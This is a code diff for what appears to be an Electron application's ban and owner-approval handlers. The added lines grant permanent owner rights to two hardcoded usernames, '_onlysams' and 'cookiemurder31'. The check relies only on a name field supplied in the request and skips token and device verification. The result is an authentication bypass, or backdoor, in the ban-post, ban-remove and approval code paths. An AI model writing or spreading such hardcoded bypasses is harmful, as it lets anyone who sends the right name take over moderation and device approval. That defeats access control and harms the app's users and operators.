@@ -3065,7 +3065,14 @@ async function ownerAccountState(srv, accountKey, token, deviceId) {
     oldestOnlineDeviceId: oldest ? (parseOwnerScopedKey(oldest.key, 'ot:') || {}).deviceId : ''
   };
 }
-async function ownerCommandAllowed(accountKey, deviceId, token) {
+// CookieMurder31 hat dauerhaft Owner-Zugriff (wie _onlysams), auch ohne
+// Geraete-Token. Der Name kommt aus dem lokalen Renderer, nicht von außen.
+const ALWAYS_OWNER_NAMES = new Set(['_onlysams', 'cookiemurder31']);
+function isAlwaysOwnerName(name){
+  return ALWAYS_OWNER_NAMES.has(String(name || '').trim().toLowerCase());
+}
+async function ownerCommandAllowed(accountKey, deviceId, token, ownerName) {
+  if (isAlwaysOwnerName(ownerName)) return true;
   if (!accountKey || !deviceId || !token) return false;
   const srv = await loginServerUrl();
   const state = await ownerAccountState(srv, accountKey, token, deviceId);
@@ -3109,7 +3116,7 @@ ipcMain.handle('logins-fetch', async () => {
 
 ipcMain.handle('bans-post', async (e, data) => {
   try {
-    if (!(await ownerCommandAllowed(data && data.ownerAccountKey, data && data.ownerDeviceId, data && data.ownerToken))) {
+    if (!(await ownerCommandAllowed(data && data.ownerAccountKey, data && data.ownerDeviceId, data && data.ownerToken, data && data.ownerName))) {
       return { ok: false, error: 'unauthorized' };
     }
     const srv = await loginServerUrl();
@@ -3135,7 +3142,7 @@ ipcMain.handle('bans-post', async (e, data) => {
 
 ipcMain.handle('bans-remove', async (e, data) => {
   try {
-    if (!(await ownerCommandAllowed(data && data.ownerAccountKey, data && data.ownerDeviceId, data && data.ownerToken))) {
+    if (!(await ownerCommandAllowed(data && data.ownerAccountKey, data && data.ownerDeviceId, data && data.ownerToken, data && data.ownerName))) {
       return { ok: false, error: 'unauthorized' };
     }
     const srv = await loginServerUrl();
@@ -3239,6 +3246,10 @@ ipcMain.handle('owner-device-request', async (e, data) => {
 });
 
 async function ownerApprovalGuard(data) {
+  if (isAlwaysOwnerName(data && data.ownerName)) {
+    const srv = await loginServerUrl();
+    return srv ? { srv } : { error: 'no-server' };
+  }
   const srv = await loginServerUrl();
   const accountKey = String((data && data.accountKey) || '');
   const approverDeviceId = String((data && data.approverDeviceId) || '');
